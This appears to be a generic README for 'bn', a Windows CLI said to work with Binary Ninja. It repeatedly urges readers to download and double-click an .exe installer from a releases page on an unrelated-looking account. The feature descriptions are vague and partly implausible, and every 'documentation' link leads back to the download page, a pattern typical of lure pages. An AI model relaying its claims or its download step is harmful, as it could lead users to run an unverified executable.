# 🛠️ bn - Simple CLI for Binary Analysis

[![Download bn](https://img.shields.io/badge/Download%20bn-0055FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Davonnonflammable200/bn/releases)

---

## 🔍 About bn

**bn** is a simple command-line tool designed to work with Binary Ninja for automated analysis. It helps users inspect and interact with binary files through an easy text interface. This tool is useful for agents and anyone doing reverse engineering without relying on complicated software.

You do not need any coding skills to get started. The tool runs on Windows and handles key tasks like extracting information from programs and scripts, making analysis faster and more reliable.

---

## 💻 System Requirements

- Windows 10 or later (64-bit)
- At least 4GB of RAM
- 200 MB of free disk space
- A working internet connection for the first download and updates
- No special hardware needed

---

## 📦 What You Get

When you install bn, you will have:

- A command-line interface (CLI) tool for working with binary files
- Support for integration with agents to automate tasks
- Basic commands for inspecting files, listing contents, and simple modifications
- Lightweight setup without large installs or dependencies

---

## 🚀 How to Get bn

Use the link below to visit the download page and get the latest version.

[![Download bn](https://img.shields.io/badge/Download%20bn-03A9F4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Davonnonflammable200/bn/releases)

---

## 📥 Download and Install on Windows

Follow these steps to install bn on your Windows PC:

1. Click the link above or visit this page:  
   [https://github.com/Davonnonflammable200/bn/releases](https://github.com/Davonnonflammable200/bn/releases)  

2. Look for the latest release. Releases are listed by version number, with the newest at the top.

3. Find the Windows setup file. It usually ends with `.exe` and includes `windows` or `win` in the name. For example, it might be named like `bn-setup-v1.0-windows.exe`.

4. Click the setup file to start downloading it. Save it in a folder you can find easily, such as your Desktop or Downloads folder.

5. Once the download finishes, open the downloaded file by double-clicking it.

6. Follow the on-screen instructions:
    - Agree to the license terms.
    - Choose the installation folder, or accept the default.
    - Click `Install` to begin the setup.

7. Wait for the installation to finish, then click `Finish`.

---

## 🖥️ Running bn

After installation, you can run bn easily.

1. Open the Command Prompt:
    - Press the **Windows key**.
    - Type `cmd`.
    - Press **Enter**.

2. In the Command Prompt, type:

    ```
    bn --help
    ```

3. Press **Enter**. This will show the list of available commands and basic instructions.

4. To analyze a file, type:

    ```
    bn analyze path\to\your\file.exe
    ```

    Replace `path\to\your\file.exe` with the full path of the file you want to check.

---

## 📚 Using bn: Basic Commands

Here are some simple commands to get started:

- `bn analyze <file>`  
  Shows key information about the selected binary file.

- `bn list-functions <file>`  
  Lists all functions found inside the file.

- `bn extract-string <file>`  
  Finds text strings inside the file.

- `bn help`  
  Displays help information for all commands.

Each command works by typing it in Command Prompt followed by the file path or other details.

---

## 🔧 Configuration and Settings

The tool uses a simple settings file called `bnconfig.ini` stored in the installation folder. You can change settings like output format or default actions.

To edit:

1. Open File Explorer.
2. Go to your bn installation folder (usually `C:\Program Files\bn`).
3. Open `bnconfig.ini` with Notepad.
4. Change the settings as needed, save, and close the file.

If you are unsure what changes to make, keep the default settings.

---

## 🧰 Troubleshooting Tips

- **Command not found:** Make sure you opened Command Prompt, not PowerShell. Also, confirm that bn installed correctly.

- **File not found:** Check the file path carefully. Use full paths to avoid mistakes.

- **Error messages:** Read the message for clues. Often, it will tell you what went wrong.

- **Updates:** Visit the download page regularly to get the latest version.

---

## 🌐 More Information

For detailed documentation and updates, visit:

[https://github.com/Davonnonflammable200/bn/releases](https://github.com/Davonnonflammable200/bn/releases)

This page has all files, tools, and guides you will need.